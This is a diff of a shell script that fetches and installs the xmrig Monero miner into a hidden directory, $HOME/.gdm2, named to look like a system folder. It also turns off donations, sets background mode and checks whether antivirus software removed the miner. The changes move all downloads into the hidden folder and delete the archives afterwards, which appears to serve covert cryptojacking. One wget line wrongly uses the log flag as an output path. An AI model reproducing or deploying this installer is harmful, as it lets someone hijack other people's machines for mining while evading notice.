@@ -178,22 +178,22 @@ rm -rf $HOME/moneroocean
 rm -rf $HOME/.moneroocean
 #rm -rf $HOME/.gdm2
 
-echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
-if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o xmrig.tar.gz; then
-  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to xmrig.tar.gz"
+echo "[*] Downloading MoneroOcean advanced version of xmrig to $HOME/.gdm2/xmrig.tar.gz"
+if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o $HOME/.gdm2/xmrig.tar.gz; then
+  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to $HOME/.gdm2/xmrig.tar.gz"
   exit 1
 fi
 
-wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
+wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -o $HOME/.gdm2/xmrig.tar.gz
 tar xf $HOME/.gdm2/xmrig.tar.gz
 
 echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2/"
 [ -d $HOME/.gdm2 ] || mkdir $HOME/.gdm2/
-if ! tar xf xmrig.tar.gz -C $HOME/.gdm2/; then
+if ! tar xf $HOME/.gdm2/xmrig.tar.gz -C $HOME/.gdm2/; then
   echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.gdm2/ directory"
 #  exit 1
 fi
-rm xmrig.tar.gz
+rm $HOME/.gdm2/xmrig.tar.gz
 
 echo "[*] Checking if advanced version of $HOME/.gdm2/xmrig works fine (and not removed by antivirus software)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
@@ -209,17 +209,17 @@ if (test $? -ne 0); then
   LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
   LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`
 
-  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to xmrig.tar.gz"
-  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o xmrig.tar.gz; then
-    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to xmrig.tar.gz"
+  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to $HOME/.gdm2/xmrig.tar.gz"
+  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o $HOME/.gdm2/xmrig.tar.gz; then
+    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to $HOME/.gdm2/xmrig.tar.gz"
     exit 1
   fi
 
-  echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
-  if ! tar xf xmrig.tar.gz -C $HOME/.gdm2 --strip=1; then
-    echo "WARNING: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
+  echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2/"
+  if ! tar xf $HOME/.gdm2/xmrig.tar.gz -C $HOME/.gdm2/ --strip=1; then
+    echo "WARNING: Can't unpack $HOME/.gdm2/xmrig.tar.gz to $HOME/.gdm2/ directory"
   fi
-  #rm xmrig.tar.gz
+  rm $HOME/.gdm2/xmrig.tar.gz
 
   echo "[*] Checking if stock version of $HOME/.gdm2/xmrig works fine (and not removed by antivirus software)"
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
@@ -341,7 +341,7 @@ cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_background.json
 cat $HOME/.gdm2/config.json
 
-rm -rf xmrig.tar*
+rm -rf $HOME/.gdm2/xmrig.tar*
 
 #PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 #PASS=`hostname`
